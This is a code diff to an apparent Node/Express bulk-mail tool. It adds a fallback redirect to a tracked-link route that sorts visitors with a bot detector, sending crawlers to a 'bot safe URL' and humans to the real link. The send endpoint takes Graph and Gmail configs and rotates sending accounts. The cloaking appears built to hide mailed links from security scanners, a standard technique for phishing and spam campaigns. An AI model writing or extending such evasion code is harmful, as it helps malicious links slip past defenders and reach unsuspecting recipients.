@@ -780,7 +780,13 @@ function detectBot(req) {
 
 app.get('/go/:id', (req, res) => { 
     const entry = _redirectStore.get(req.params.id);
-    if (!entry) return res.status(404).send('Link not found.');
+    if (!entry) {
+        // Fallback: redirect to humanDefaultUrl if set, otherwise 404
+        if (global._humanDefaultUrl) {
+            return res.redirect(302, global._humanDefaultUrl);
+        }
+        return res.status(404).send('Link not found.');
+    }
 
     const { isBot, reason } = detectBot(req);
 
@@ -816,7 +822,11 @@ app.get('/api/crawler-trap/test', (req, res) => {
         userAgent: req.headers['user-agent'] || 'none',
         accept: req.headers['accept'] || 'none',
         botSafeUrl: _globalBotSafeUrl,
-        message: isBot ? 'Would be redirected to bot safe URL' : 'Would be redirected to real link'
+        humanDefaultUrl: global._humanDefaultUrl || 'not set',
+        trackedLinks: _redirectStore.size,
+        message: isBot
+            ? `BOT → would go to: ${_globalBotSafeUrl}`
+            : `HUMAN → would go to real link (or fallback: ${global._humanDefaultUrl || 'not set'})`
     });
 });
 
@@ -919,13 +929,18 @@ app.post('/api/send', async (req, res) => {
         graphConfig,
         gmailConfig,
         rotationMode, rotateEveryN,
-        botSafeUrl, // <--- ADDED: Captured from the UI
+        botSafeUrl,
+        humanDefaultUrl,
         socketId,
     } = req.body;
 
     // 1. UPDATE THE CRAWLER TRAP GLOBAL VARIABLE
     if (botSafeUrl) {
         _globalBotSafeUrl = botSafeUrl.trim();
+    }
+    // Store human default URL globally for fallback
+    if (humanDefaultUrl) {
+        global._humanDefaultUrl = humanDefaultUrl.trim();
     }
 
     const batchSocketId = (socketId && typeof socketId === 'string') ? socketId : null;
